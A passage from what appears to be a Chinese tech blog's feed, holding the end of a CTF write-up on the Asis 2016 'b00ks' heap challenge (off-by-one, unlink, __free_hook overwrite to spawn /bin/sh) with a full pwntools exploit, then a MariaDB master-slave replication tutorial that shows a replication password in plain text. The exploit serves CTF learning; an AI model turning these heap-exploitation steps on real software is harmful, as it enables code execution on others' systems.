name时由于name为/bin/sh，刚好作为system参数使用。当然这里也可以直接用one_gaget写入，效果一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#算出free_hook地址</span></span><br><span class="line">addr=libc_leak + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">content=p64(libc_leak + libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free_hook地址写入chunk6的description地址处</span></span><br><span class="line">editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line"><span class="comment">#修改free_hook内容为system函数</span></span><br><span class="line">editbook(<span class="number">6</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发system('/bin/sh')</span></span><br><span class="line">deletebook(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">binary = ELF(<span class="string">"b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span><span class="params">(name_size, name, des_size, des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Auther Name</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Change Auther name</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"5"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Edit book's description</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span><span class="params">(book_id, new_des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.writeline(str(book_id))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book by id</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span><span class="params">(book_id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">createname(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">0x20</span>,<span class="string">'a'</span>,<span class="number">0x20</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Author:'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = u64(book1_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = book1_addr - <span class="number">0x1080</span></span><br><span class="line"></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 1'</span>, <span class="number">0x20</span>, <span class="string">'desc buf'</span>) <span class="comment"># 2</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 2'</span>, <span class="number">0x20</span>, <span class="string">'desc buf 2'</span>) <span class="comment"># 3</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">ptr = heap_base + <span class="number">0x1180</span></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x101</span>) </span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(ptr - <span class="number">0x10</span>) </span><br><span class="line">payload += <span class="string">'\x00'</span> * <span class="number">0xe0</span> </span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment"># 4</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">'target'</span>) <span class="comment"># 5</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read write'</span>) <span class="comment"># 6</span></span><br><span class="line">editbook(<span class="number">4</span>, payload) <span class="comment"># overflow</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">5</span>) <span class="comment"># unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11a0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x10c0</span>)</span><br><span class="line">payload += <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">editbook(<span class="number">4</span>,payload) </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span><span class="params">(addr, content, size)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    editbook(<span class="number">6</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_at</span><span class="params">(addr)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr)) </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    io.info(content)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">libc_leak = u64(read_at(heap_base + <span class="number">0x11e0</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">io.info(<span class="string">'libc leak  0x%x'</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">write_to(libc_leak + libc.symbols[<span class="string">'__free_hook'</span>], p64(libc_leak + libc.symbols[<span class="string">'system'</span>]), <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;许久没有练习pwn题了，今天拿一道堆题练练手，漏洞点在Null byte off-by-one以及unlink。&lt;/p&gt;
&lt;p&gt;题目来源(包括exp)：Asis CTF 2016 &lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;b00ks&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
    
    
      <category term="unlink" scheme="http://yoursite.com/tags/unlink/"/>
    
      <category term="off-by-one" scheme="http://yoursite.com/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-主从复制</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
    <published>2020-02-23T08:41:18.000Z</published>
    <updated>2020-02-23T08:42:36.320Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql复制是指从一个mysql服务器(MASTER)将数据通过日志的方式经过网络传送到另一台或多台mysql服务器(SLAVE)，然后在slave上重放(replay或redo)传送过来的日志，以达到和master数据同步的目的。</p><a id="more"></a><p>它的工作原理很简单。首先确保master数据库上开启了二进制日志，这是复制的前提。</p><ul><li>在slave准备开始复制时，首先要执行change master to语句设置连接到master服务器的连接参数，在执行该语句的时候要提供一些信息，包括如何连接和要从哪复制binlog，这些信息在连接的时候会记录到slave的datadir下的master.info文件中，以后再连接master的时候将不用再提供这新信息而是直接读取该文件进行连接。</li><li>在slave上有两种线程，分别是IO线程和SQL线程<ul><li>IO线程用于连接master，监控和接受master的binlog。当启动IO线程成功连接master时，master会同时启动一个dump线程，该线程将slave请求要复制的binlog给dump出来，之后IO线程负责监控并接收master上dump出来的二进制日志，当master上binlog有变化的时候，IO线程就将其复制过来并写入到自己的中继日志(relay log)文件中。</li><li>slave上的另一个线程SQL线程用于监控、读取并重放relay log中的日志，将数据写入到自己的数据库中。</li></ul></li></ul><p>从复制的机制上可以知道，在复制进行前，slave上必须具有master上部分完整内容作为复制基准数据。例如，master上有数据库A，二进制日志已经写到了pos1位置，那么在复制进行前，slave上必须要有数据库A，且如果要从pos1位置开始复制的话，还必须有和master上pos1之前完全一致的数据。如果不满足这样的一致性条件，那么在replay中继日志的时候将不知道如何进行应用而导致数据混乱。也就是说，复制是基于binlog的position进行的，复制之前必须保证position一致。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="同步复制"><a href="#同步复制" class="headerlink" title="同步复制"></a>同步复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕后还需要等待所有的slave都写完了relay log才认为此次DDL/DML成功，然后才会返回成功信息给客户端。同步复制的问题是master必须等待，所以延迟较大，在MySQL中不使用这种复制方式。</p><h4 id="半同复制"><a href="#半同复制" class="headerlink" title="半同复制"></a>半同复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕后还要等待一个slave写完relay log并返回确认信息给master，master才认为此次DDL/DML语句是成功的，然后才会发送成功信息给客户端。半同步复制只需等待一个slave的回应，且等待的超时时间可以设置，超时后会自动降级为异步复制，所以在局域网内(网络延迟很小)使用半同步复制是可行的。</p><h4 id="异步复制"><a href="#异步复制" class="headerlink" title="异步复制"></a>异步复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕立即返回成功信息给客户端，而不管slave是否已经开始复制。这样的复制方式导致的问题是，当master写完了binlog，而slave还没有开始复制或者复制还没完成时，slave上和master上的数据暂时不一致，且此时master突然宕机，slave将会丢失一部分数据。如果此时把slave提升为新的master，那么整个数据库就永久丢失这部分数据。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li>为master和slave设定不同的server-id，这是主从复制结构中非常关键的标识号。到了MySQL 5.7，似乎不设置server id就无法开启binlog。设置server id需要重启MySQL实例。</li><li>开启master的binlog。刚安装并初始化的MySQL默认未开启binlog，建议手动设置binlog且为其设定文件名，否则默认以主机名为基名时修改主机名后会找不到日志文件。</li><li>最好设置master上的变量sync_binlog=1(MySQL 5.7.7之后默认为1，之前的版本默认为0)，这样每写一次二进制日志都将其刷新到磁盘，让slave服务器可以尽快地复制。防止万一master的二进制日志还在缓存中就宕机时，slave无法复制这部分丢失的数据。</li><li>最好设置master上的redo log的刷盘变量innodb_flush_log_at_trx_commit=1(默认值为1)，这样每次提交事务都会立即将事务刷盘保证持久性和一致性。</li><li>在slave上开启中继日志relay log。这个是默认开启的，同样建议手动设置其文件名。</li><li>建议在master上专门创建一个用于复制的用户，它只需要有复制权限replication slave用来读取binlog。</li><li>确保slave上的数据和master上的数据在”复制的起始position之前”是完全一致的。如果master和slave上数据不一致，复制会失败。</li><li>记下master开始复制前binlog的position，因为在slave连接master时需要指定从master的哪个position开始复制。</li><li>考虑是否将slave设置为只读，也就是开启read_only选项。这种情况下，除了具有super权限(mysql 5.7.16还提供了super_read_only禁止super的写操作)和SQL线程能写数据库，其他用户都不能进行写操作。这种禁写对于slave来说，绝大多数场景都非常适合。</li></ol><h4 id="一主一从"><a href="#一主一从" class="headerlink" title="一主一从"></a>一主一从</h4><p>主：192.168.163.132</p><p>从：192.168.163.135</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#slave配置</span></span><br><span class="line">[server]</span><br><span class="line">log_bin=mysql-bin</span><br><span class="line">relay-log=slave-bin</span><br><span class="line">server-id=111</span><br><span class="line"></span><br><span class="line"><span class="comment">#master配置</span></span><br><span class="line">[server]</span><br><span class="line">log_bin=master-bin</span><br><span class="line">sync-binlog=1</span><br><span class="line">server-id=100</span><br><span class="line"></span><br><span class="line"><span class="comment">#master创建用于复制的用户，并授予复制权限</span></span><br><span class="line">create user <span class="string">'repl'</span>@<span class="string">'192.168.163.%'</span> identified by <span class="string">'dqy751421'</span>;</span><br><span class="line">grant REPLICATION SLAVE on *.* to <span class="string">'repl'</span>@<span class="string">'192.168.163.%'</span>;</span><br></pre></td></tr></table></figure><h5 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h5><p>如果待复制的master上已有数据，那么先要将这些数据备份到slave上，并获取master上的二进制日志的当前坐标，从而使得slave重做relay log时不会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#创建master数据</span><br><span class="line">DROP DATABASE IF EXISTS backuptest;</span><br><span class="line">CREATE DATABASE backuptest;</span><br><span class="line">USE backuptest;</span><br><span class="line"></span><br><span class="line"># 创建myisam类型的数值辅助表和插入数据的存储过程</span><br><span class="line">CREATE TABLE num_isam (n INT NOT NULL PRIMARY KEY) ENGINE &#x3D; MYISAM ;</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS proc_num1;</span><br><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE proc_num1 (num INT) </span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE rn INT DEFAULT 1 ;</span><br><span class="line">    TRUNCATE TABLE backuptest.num_isam ;</span><br><span class="line">    INSERT INTO backuptest.num_isam VALUES(1) ;</span><br><span class="line">    dd: WHILE rn * 2 &lt; num DO </span><br><span class="line">        BEGIN</span><br><span class="line">            INSERT INTO backuptest.num_isam </span><br><span class="line">            SELECT rn + n FROM backuptest.num_isam;</span><br><span class="line">            SET rn &#x3D; rn * 2 ;</span><br><span class="line">        END ;</span><br><span class="line">    END WHILE dd;</span><br><span class="line">    INSERT INTO backuptest.num_isam </span><br><span class="line">    SELECT n + rn </span><br><span class="line">    FROM backuptest.num_isam </span><br><span class="line">    WHERE n + rn &lt;&#x3D; num;</span><br><span class="line">END ;</span><br><span class="line">$$</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 创建innodb类型的数值辅助表和插入数据的存储过程</span><br><span class="line">CREATE TABLE num_innodb (n INT NOT NULL PRIMARY KEY) ENGINE &#x3D; INNODB ;</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS proc_num2;</span><br><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE proc_num2 (num INT) </span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE rn INT DEFAULT 1 ;</span><br><span class="line">    TRUNCATE TABLE backuptest.num_innodb ;</span><br><span class="line">    INSERT INTO backuptest.num_innodb VALUES(1) ;</span><br><span class="line">    dd: WHILE rn * 2 &lt; num DO </span><br><span class="line">        BEGIN</span><br><span class="line">            INSERT INTO backuptest.num_innodb </span><br><span class="line">            SELECT rn + n FROM backuptest.num_innodb;</span><br><span class="line">            SET rn &#x3D; rn * 2 ;</span><br><span class="line">        END ;</span><br><span class="line">    END WHILE dd;</span><br><span class="line">    INSERT INTO backuptest.num_innodb </span><br><span class="line">    SELECT n + rn </span><br><span class="line">    FROM backuptest.num_innodb </span><br><span class="line">    WHERE n + rn &lt;&#x3D; num ;</span><br><span class="line">END ;</span><br><span class="line">$$</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 分别向两个数值辅助表中插入100W条数据</span><br><span class="line">CALL proc_num1 (1000000) ;</span><br><span class="line">CALL proc_num2 (1000000) ;</span><br></pre></td></tr></table></figure><p>获取当前position位置，为了安全起见先锁表，此时无法进行commit操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#锁表</span><br><span class="line">flush tables with read lock;</span><br><span class="line"></span><br><span class="line">#查看二进制日志的position位置</span><br><span class="line">show master status;</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br><span class="line">| File              | Position | Binlog_Do_DB | Binlog_Ignore_DB |</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br><span class="line">| master-bin.000001 |    14872 |              |                  |</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br></pre></td></tr></table></figure><p>备份数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysqldump --all-databases --single-transaction --master-data=2 &gt;dump.db</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看大小</span></span><br><span class="line">ls -lh dump.db </span><br><span class="line">-rw-r--r-- 1 root root 22M Feb 23 03:02 dump.db</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看对应二进制日志坐标，即上文查看的坐标</span></span><br><span class="line">grep -i -m 1 <span class="string">'change master to'</span> dump.db</span><br></pre></td></tr></table></figure><p>在slave上导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#复制</span></span><br><span class="line">ansible 192.168.163.135 -m copy -a <span class="string">'src=./dump.db dest=/root/dump.db'</span></span><br><span class="line"><span class="comment">#导入</span></span><br><span class="line">mysql&lt;dump.db</span><br></pre></td></tr></table></figure><h5 id="slave开启复制"><a href="#slave开启复制" class="headerlink" title="slave开启复制"></a>slave开启复制</h5><p>在slave端执行指向master，需要配置如下数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#从未连接过master需要配置如下</span><br><span class="line">change master to</span><br><span class="line">    -&gt; master_host&#x3D;&#39;192.168.163.132&#39;,</span><br><span class="line">    -&gt; master_port&#x3D;3306,</span><br><span class="line">    -&gt; master_user&#x3D;&#39;repl&#39;,</span><br><span class="line">    -&gt; master_password&#x3D;&#39;dqy751421&#39;,</span><br><span class="line">    -&gt; master_log_file&#x3D;&#39;master-bin.000001&#39;,# 指明需要复制的binlog文件</span><br><span class="line">    -&gt; master_log_pos&#x3D;14872;# 指明binlog的position</span><br><span class="line">    </span><br><span class="line">#该指令执行后会在数据库目录创建两个文件master.info和relay-log.info</span><br><span class="line">master.info文件记录的是IO线程相关的信息，也就是连接master以及读取master binlog的信息。通过这个文件，下次连接master时就不需要再提供连接选项。</span><br><span class="line">relay-log.info文件中记录的是SQL线程相关的信息</span><br></pre></td></tr></table></figure><p>启动两个进程后便正常开始主从复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#一次性启动&#x2F;关闭</span><br><span class="line">start slave&#x2F;stop;</span><br><span class="line">#分开启动</span><br><span class="line">start slave io_thread;</span><br><span class="line">start slave sql_thread;</span><br></pre></td></tr></table></figure><p>master.info文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">18<span class="comment"># 本文件的行数</span></span><br><span class="line">master-bin.000001<span class="comment"># IO线程正从哪个master binlog读取日志</span></span><br><span class="line">15366<span class="comment"># IO线程读取到master binlog的位置</span></span><br><span class="line">192.168.163.132<span class="comment"># master_host</span></span><br><span class="line">repl<span class="comment"># master_user</span></span><br><span class="line">dqy751421<span class="comment"># master_password</span></span><br><span class="line">3306<span class="comment"># master_port</span></span><br><span class="line">60<span class="comment"># slave重连master的超时时长</span></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">1800.000</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>relay-log.info文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./slave-bin.000002<span class="comment"># 当前SQL线程正在读取的relay-log文件</span></span><br><span class="line">1024<span class="comment"># SQL线程已执行到的relay log位置</span></span><br><span class="line">master-bin.000001<span class="comment"># SQL线程最近执行的操作对应的是哪个master binlog</span></span><br><span class="line">15366<span class="comment"># SQL线程最近执行的操作对应的是master binlog的哪个位置</span></span><br></pre></td></tr></table></figure><p>查看slave状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show slave status\G;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;mysql复制是指从一个mysql服务器(MASTER)将数据通过日志的方式经过网络传送到另一台或多台mysql服务器(SLAVE)，然后在slave上重放(replay或redo)传送过来的日志，以达到和master数据同步的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-备份</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E5%A4%87%E4%BB%BD/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E5%A4%87%E4%BB%BD/</id>
    <published>2020-02-23T08:40:51.000Z</published>
    <updated>2020-02-23T08:42:26.611Z</updated>
    
